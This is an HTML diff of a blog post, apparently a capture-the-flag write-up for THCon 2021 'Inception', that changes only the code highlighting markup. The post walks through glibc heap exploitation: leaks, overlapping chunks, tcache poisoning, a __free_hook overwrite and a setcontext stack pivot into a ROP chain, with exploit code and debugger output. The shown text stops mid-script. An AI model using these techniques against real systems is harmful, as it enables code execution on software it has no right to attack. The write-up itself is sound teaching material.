@@ -21,6 +21,8 @@
     
     <meta name="twitter:title" content="THCon 2021 - Inception" />
     <meta name="twitter:description" content="" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@slowerzs">
     <meta name="twitter:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
 
     <link rel="canonical" href="https://blog.slowerzs.net/archive/thcon-2021-inception/">
@@ -28,10 +30,8 @@
     <link rel="stylesheet" href="https://blog.slowerzs.net/css/bootstrap.min.css" />
 
     <link rel="stylesheet" href="https://blog.slowerzs.net/css/custom.css" />
+    <link rel="stylesheet" href="https://blog.slowerzs.net/css/syntax.css" />
 
-    
-    <link rel="stylesheet" id="light-css" href="https://blog.slowerzs.net/css/stackoverflow-light.min.css" media="screen">
-    <link rel="stylesheet" id="dark-css" href="https://blog.slowerzs.net/css/stackoverflow-dark.min.css" media="screen">
     
 
     <link rel="shortcut icon"
@@ -290,38 +290,38 @@ However, if we created a <code>dream</code> whose size was filling the content o
 <p>To actually get the value, we will create two <code>dreams</code> and free them to get in the above situation, then allocate a new <code>dream</code> with a content size of 1 (we cannot do 0 bytes), and then view its content. Since we are creating the chunk, we will overwrite the least significate byte of the pointer, but luckily for us, the base address of the heap is page aligned, which means that last 12 bits of the base address of the heap are zeros. We can therefore safely set these 12 bits to 0 to get our leak (ignoring the 8 bits we overwrote).</p>
 <p>In newer version of the glibc, this is not as straightforward.</p>
 <p>Scripting this in python, we get :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>delete(1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x10, <span style="color:#a31515">&#39;0&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>leak = view(0)
-</span></span><span style="display:flex;"><span>heap_leak = u64(leak[:6].ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
-</span></span><span style="display:flex;"><span>heap_base = heap_leak &amp; ~0xfff <span style="color:#008000"># Setting the last 12 bits to 0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;heap base : </span><span style="color:#a31515">{</span>hex(heap_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span> <span class="c1"># Setting the last 12 bits to 0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><p>It works !</p>
 <blockquote>
 <p>[+] heap base : 0x55ab13e63000</p>
 </blockquote>
 <p>Now, we do some cleanup for what comes next :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>delete(1)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span></code></pre></div><h3 id="leaking-libc">Leaking LIBC</h3>
 <p>To get a libc leak, we need to get a libc address on the heap, which we could then leak using the same method. However, I&rsquo;ll do this using a different method : it is the first step to what comes next anyway.</p>
 <h3 id="overlapping-chunks">Overlapping chunks</h3>
 <p>For this, we will trick <code>malloc</code> in creating two overlapping chunks using the second vulnerability. This technique is explained in great depth <a href="https://devel0pment.de/?p=688">here</a> with some malloc internals. The idea relies on using the off by null to clear the least significant byte of the metadata of the next chunk, which indicates notably if the previous chunk is in use or not, and then make it coalesce two chunks that it thinks are adjacent, while they are not.</p>
 <p>Let&rsquo;s go step by step.</p>
 <p>First we will create 4 chunks, of different sizes (I will come back to the reasons for the sizes in a moment) and free the first one:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x68, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 </span></span></code></pre></div><p>We have the following situation :</p>
 <pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
@@ -339,14 +339,14 @@ Chunk(addr=0x55939522bcd0, size=0x210, flags=PREV_INUSE)
 <p>Next, we will leverage the second vulnerability to clear the least signigicant bit of the <code>cccc</code> chunk, updating the <code>PREV_INUSE</code> flag. This is also why we <code>0x4F0</code> for the dream size, it creates a <code>0x500</code> chunk, and so while clearing this bit, we do not shrink the chunk size. This will make <code>malloc</code> think that the chunk <code>bbbb</code> is free while it actually is not.
 This is not sufficient for our goal : we also need to update the <code>prev_size</code> field of the chunk <code>cccc</code> to make it think that the previous chunk is <code>aaaa</code>. Since this field is the first 8 bytes of the metadata of chunk <code>cccc</code>, this is also the last 8 bytes of chunk <code>bbbb</code>, which we can edit. So we will update it to be <code>0x570</code>, the size of chunk <code>aaaa</code> + <code>bbbb</code>, making it believe there is only one chunk before.</p>
 <p>Let&rsquo;s continue our script :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x680, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570)) <span style="color:#008000"># Set prev_size</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x680</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span> <span class="c1"># Set prev_size</span>
 </span></span></code></pre></div><p>in our debugger, we get :</p>
 <pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
@@ -372,15 +372,15 @@ NON_MAIN_ARENA flag: Off
 <p>Now, all we have to do is free chunk <code>cccc</code>, which is big enough to not go in either the <code>tcache</code> or <code>fastbin</code>, and will then trigger the coalescing of the chunk (if this is not clear, check the MallocInternals link above).
 The chunk will coalesce and merge with what it think is his adjacent chunk, which is <code>aaaa</code>instead of <code>bbbb</code>, creating a big free chunk that goes over <code>bbbb</code>, of size <code>0xa70</code>. This is also the reason why we need <code>dddd</code> : this way <code>cccc</code> is not merged with the top chunk (the size of <code>dddd</code> does not matter).</p>
 <p>Let&rsquo;s update our script:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x680, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570)) <span style="color:#008000"># Set prev_size</span>
-</span></span><span style="display:flex;"><span>delete(2)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x680</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span> <span class="c1"># Set prev_size</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 </span></span></code></pre></div><p>And the result :</p>
 <pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
@@ -412,23 +412,23 @@ Fastbins[idx=6, size=0x80] 0x00
 </code></pre><p>We have succesfully coalesced the chunks ! (<code>gdb-gef</code> does not show chunk <code>bbbb</code> in the list, but it is still allocated and we still control it).</p>
 <p>Now, to get our libc leak, all we have to do, is to allocate a <code>dream</code> of size <code>0x4f0</code>, since both the <code>tcache</code> and <code>fastbins</code> cannot give a chunk of the requested size, it will take a slice (this is possible because this chunk is in the <code>unsorted bin</code>) of the free chunk of size <code>0xa70</code> and push down the libc address right over the content of chunk <code>bbbb</code> (this is because the remaining <code>0x570</code> bytes chunk is still in the <code>unsorted bin</code>).</p>
 <p>Viewing the content of <code>bbbb</code> should output a libc address.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x68, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(0)
-</span></span><span style="display:flex;"><span>edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570))
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;push&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>data = view(1)
-</span></span><span style="display:flex;"><span>libc_leak = u64(data[:6].strip().ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
-</span></span><span style="display:flex;"><span>libc_base = libc_leak - 0x3ebca0 <span style="color:#008000"># We find this offset using our debugger :)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;libc base : </span><span style="color:#a31515">{</span>hex(libc_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;push&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># We find this offset using our debugger :)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><p>And we have a libc leak !</p>
 <blockquote>
 <p>[+] libc base : 0x7f5bebc37000</p>
@@ -437,9 +437,9 @@ Fastbins[idx=6, size=0x80] 0x00
 <p>So, why did we do all of this ? We could have freed a chunk into the <code>unsorted bin</code>, and used the first bug to leak the libc address.</p>
 <p>Having two overlapping chunks is very useful for us : remember the size of <code>bbbb</code> - it is <code>0x70</code> bytes. Therefore, if we free it, it will end up in the corresponding <code>tcache</code>, and if you remember the beginning, the first 8 bytes are a pointer to the next free chunk in the same <code>tcache</code>. But since we have overlapping chunks, we can control this pointer ! Which means, if we make more allocations from the same <code>tcache</code>, we will get <code>bbbb</code> first, and then a fake chunk, at an address we can control, and so, we can write anywhere in memory !</p>
 <p>Let&rsquo;s see this in action</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)               <span style="color:#008000"># Overlapping with &#34;bbbb&#34;, named &#34;eeee&#34;</span>
-</span></span><span style="display:flex;"><span>delete(2)                        <span style="color:#008000"># We immediately free it</span>
-</span></span><span style="display:flex;"><span>edit(1, p64(0x012345679abcdef))  <span style="color:#008000"># Overwrite the pointer</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>               <span class="c1"># Overlapping with &#34;bbbb&#34;, named &#34;eeee&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                        <span class="c1"># We immediately free it</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x012345679abcdef</span><span class="p">))</span>  <span class="c1"># Overwrite the pointer</span>
 </span></span></code></pre></div><p>Looking at the <code>tcache</code> we can see we corrupted our list :</p>
 <pre tabindex="0"><code>gef➤  heap bins
 ...
@@ -449,14 +449,14 @@ Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x564c2d1037a0, size=0x70,
 <p>Great targets are hooks ! Hooks, such as <code>__malloc_hook</code> or <code>__free_hook</code>, are pointers to functions to call when the corresponding function in their name is called.
 Since we can trigger both of these functions, they seem like good targets.</p>
 <p>Let&rsquo;s modify our script to overwrite <code>__free_hook</code> (I&rsquo;ll come back to why <code>__free_hook</code> rather than <code>malloc_hook</code> just after) :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>edit(1, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a_random_string&#39;</span>)      <span style="color:#008000"># take out &#34;eeee&#34; out of the tcache</span>
-</span></span><span style="display:flex;"><span>add(0x60, p64(0x0123456789abcdef)) <span style="color:#008000"># overwrite __free_hook</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a_random_string&#39;</span><span class="p">)</span>      <span class="c1"># take out &#34;eeee&#34; out of the tcache</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0123456789abcdef</span><span class="p">))</span> <span class="c1"># overwrite __free_hook</span>
 </span></span></code></pre></div><p>Now, calling free triggers a segfault, with <code>rip</code> equals to <code>0x0123456789abcdef</code> ! We can control <code>rip</code>.</p>
 <h2 id="stack-pivoting">Stack pivoting</h2>
 <p>Now we can control the execution, but where do we want to go ? Remember that there is a seccomp whitelist ! Without it, we could try to call a <a href="https://github.com/david942j/one_gadget">one gadget</a> and get a shell, but here <code>execve</code> and others are not allowed.</p>
@@ -486,239 +486,239 @@ However, the argument to <code>free</code> is a pointer to the chunk we are tryi
 0x000521ff      c3             ret
 </code></pre><p>We can control the value of many registers, including <code>rsp</code>, we just have to remember to put in <code>rcx</code> the address of the next gadget to start the ropchain - because it will be push on the stack, this is the value that the <code>ret</code> instruction will pop and execute.</p>
 <p>Let&rsquo;s update our script and start the ropchain (and change the random string to the path to the flag, we will use this later) :</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
-</span></span><span style="display:flex;"><span>gadget = libc_base + 0x521b5                          <span style="color:#008000"># The address of the setcontext gadget</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
-</span></span><span style="display:flex;"><span>delete(2)
-</span></span><span style="display:flex;"><span>edit(1, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;/home/user/flag.txt</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)                 <span style="color:#008000"># Since we will need this string later to open the file, put it somewhere in the heap right now</span>
-</span></span><span style="display:flex;"><span>add(0x60, p64(gadget))                                <span style="color:#008000"># overwrite __free_hook with the address of the setcontext gadget</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)              <span style="color:#008000"># We could set the other register to useful values, but we have a lot of space so this is fine</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(rsp_value)
-</span></span><span style="display:flex;"><span>ropchain += p64(rcx_value)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x800, ropchain)
-</span></span><span style="display:flex;"><span>delete(5)                                             <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>                          <span class="c1"># The address of the setcontext gadget</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>                 <span class="c1"># Since we will need this string later to open the file, put it somewhere in the heap right now</span>
